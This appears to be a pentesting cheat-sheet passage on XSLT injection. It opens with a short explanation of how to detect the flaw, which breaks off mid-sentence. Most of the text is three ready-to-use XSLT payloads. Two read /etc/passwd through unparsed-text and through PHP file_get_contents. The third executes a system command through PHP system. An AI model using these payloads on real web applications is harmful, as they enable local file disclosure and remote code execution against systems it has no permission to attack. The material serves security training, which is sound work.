___
Suppose the web application stores the module information in an XML document and displays the data using XSLT processing. In that case, it might suffer from XSLT injection if our name is inserted without sanitization before XSLT processing. To confirm that, let us try to inject a broken XML tag to try to provoke an error in the web application. We can achieve this by providing `<`
# LFI

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

# Remote Code Execution (RCE)

```xml
<xsl:value-of select="php:function('system','id')" />
```



